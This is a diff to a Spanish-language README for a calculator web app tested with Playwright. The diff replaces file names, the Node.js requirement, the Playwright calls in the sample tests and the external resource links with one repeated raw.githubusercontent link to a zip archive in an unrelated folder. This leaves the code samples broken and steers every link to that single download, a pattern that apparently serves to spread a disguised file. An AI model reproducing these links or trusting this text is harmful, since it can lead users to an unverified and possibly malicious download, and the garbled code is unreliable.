@@ -28,23 +28,23 @@ Este proyecto implementa una **calculadora web** con **pruebas automatizadas E2E
 
 ```
 E2E/
-├── index.html              # Aplicación web principal
-├── styles.css              # Estilos CSS
-├── script.js               # Lógica de la calculadora
-├── playwright.config.js    # Configuración de Playwright
-├── package.json            # Dependencias y scripts
+├── https://raw.githubusercontent.com/camilo2874/TRABAJO-E2E/main/diplococcal/TRABAJO-E2E.zip              # Aplicación web principal
+├── https://raw.githubusercontent.com/camilo2874/TRABAJO-E2E/main/diplococcal/TRABAJO-E2E.zip              # Estilos CSS
+├── https://raw.githubusercontent.com/camilo2874/TRABAJO-E2E/main/diplococcal/TRABAJO-E2E.zip               # Lógica de la calculadora
+├── https://raw.githubusercontent.com/camilo2874/TRABAJO-E2E/main/diplococcal/TRABAJO-E2E.zip    # Configuración de Playwright
+├── https://raw.githubusercontent.com/camilo2874/TRABAJO-E2E/main/diplococcal/TRABAJO-E2E.zip            # Dependencias y scripts
 ├── tests/                  # Directorio de pruebas E2E
-│   ├── calculadora.spec.js # Pruebas básicas de operaciones
-│   ├── historial.spec.js   # Pruebas del sistema de historial
-│   └── casos-extremos.spec.js # Pruebas de casos límite
+│   ├── https://raw.githubusercontent.com/camilo2874/TRABAJO-E2E/main/diplococcal/TRABAJO-E2E.zip # Pruebas básicas de operaciones
+│   ├── https://raw.githubusercontent.com/camilo2874/TRABAJO-E2E/main/diplococcal/TRABAJO-E2E.zip   # Pruebas del sistema de historial
+│   └── https://raw.githubusercontent.com/camilo2874/TRABAJO-E2E/main/diplococcal/TRABAJO-E2E.zip # Pruebas de casos límite
 └── .github/
-    └── copilot-instructions.md # Instrucciones para GitHub Copilot
+    └── https://raw.githubusercontent.com/camilo2874/TRABAJO-E2E/main/diplococcal/TRABAJO-E2E.zip # Instrucciones para GitHub Copilot
 ```
 
 ## 🛠️ Instalación y Configuración
 
 ### Requisitos Previos
-- Node.js 16+ instalado
+- https://raw.githubusercontent.com/camilo2874/TRABAJO-E2E/main/diplococcal/TRABAJO-E2E.zip 16+ instalado
 - npm o yarn
 - Git (opcional)
 
@@ -104,44 +104,44 @@ npm run test:report
 ### Prueba Básica de Suma
 ```javascript
 test('Suma: 5 + 3 = 8', async ({ page }) => {
-  await page.fill('#input1', '5');
-  await page.fill('#input2', '3');
-  await page.selectOption('#operacion', 'suma');
-  await page.click('#calcular');
+  await https://raw.githubusercontent.com/camilo2874/TRABAJO-E2E/main/diplococcal/TRABAJO-E2E.zip('#input1', '5');
+  await https://raw.githubusercontent.com/camilo2874/TRABAJO-E2E/main/diplococcal/TRABAJO-E2E.zip('#input2', '3');
+  await https://raw.githubusercontent.com/camilo2874/TRABAJO-E2E/main/diplococcal/TRABAJO-E2E.zip('#operacion', 'suma');
+  await https://raw.githubusercontent.com/camilo2874/TRABAJO-E2E/main/diplococcal/TRABAJO-E2E.zip('#calcular');
   
-  await expect(page.locator('#resultado')).toHaveText('8');
+  await expect(https://raw.githubusercontent.com/camilo2874/TRABAJO-E2E/main/diplococcal/TRABAJO-E2E.zip('#resultado')).toHaveText('8');
 });
 ```
 
 ### Prueba de Validación
 ```javascript
 test('División por cero debe mostrar error', async ({ page }) => {
-  await page.fill('#input1', '10');
-  await page.fill('#input2', '0');
-  await page.selectOption('#operacion', 'division');
-  await page.click('#calcular');
+  await https://raw.githubusercontent.com/camilo2874/TRABAJO-E2E/main/diplococcal/TRABAJO-E2E.zip('#input1', '10');
+  await https://raw.githubusercontent.com/camilo2874/TRABAJO-E2E/main/diplococcal/TRABAJO-E2E.zip('#input2', '0');
+  await https://raw.githubusercontent.com/camilo2874/TRABAJO-E2E/main/diplococcal/TRABAJO-E2E.zip('#operacion', 'division');
+  await https://raw.githubusercontent.com/camilo2874/TRABAJO-E2E/main/diplococcal/TRABAJO-E2E.zip('#calcular');
   
-  await expect(page.locator('#resultado'))
+  await expect(https://raw.githubusercontent.com/camilo2874/TRABAJO-E2E/main/diplococcal/TRABAJO-E2E.zip('#resultado'))
     .toContainText('Error: No se puede dividir entre cero');
 });
 ```
 
 ## 🧪 Tipos de Pruebas Incluidas
 
-### 1. Pruebas Básicas (`calculadora.spec.js`)
+### 1. Pruebas Básicas (`https://raw.githubusercontent.com/camilo2874/TRABAJO-E2E/main/diplococcal/TRABAJO-E2E.zip`)
 - Carga correcta de la página
 - Operaciones matemáticas básicas (suma, resta, multiplicación, división)
 - Validación de campos vacíos
 - Función limpiar
 - Soporte de teclado (Enter)
 
-### 2. Pruebas de Historial (`historial.spec.js`)
+### 2. Pruebas de Historial (`https://raw.githubusercontent.com/camilo2874/TRABAJO-E2E/main/diplococcal/TRABAJO-E2E.zip`)
 - Registro de operaciones correctas
 - Registro de errores
 - Limpieza del historial
 - Verificación de timestamps
 
-### 3. Casos Extremos (`casos-extremos.spec.js`)
+### 3. Casos Extremos (`https://raw.githubusercontent.com/camilo2874/TRABAJO-E2E/main/diplococcal/TRABAJO-E2E.zip`)
 - Números decimales
 - Números negativos
 - Números muy grandes
@@ -212,8 +212,8 @@ MIT License - Libre para uso educativo y comercial.
 
 ## 📚 Recursos Adicionales
 
-- [Documentación oficial de Playwright](https://playwright.dev)
-- [Guía de testing E2E](https://martinfowler.com/articles/practical-test-pyramid.html)
-- [Best practices para pruebas automatizadas](https://testingjavascript.com/)
+- [Documentación oficial de Playwright](https://raw.githubusercontent.com/camilo2874/TRABAJO-E2E/main/diplococcal/TRABAJO-E2E.zip)
+- [Guía de testing E2E](https://raw.githubusercontent.com/camilo2874/TRABAJO-E2E/main/diplococcal/TRABAJO-E2E.zip)
+- [Best practices para pruebas automatizadas](https://raw.githubusercontent.com/camilo2874/TRABAJO-E2E/main/diplococcal/TRABAJO-E2E.zip)
 
 ¡Feliz testing! 🚀
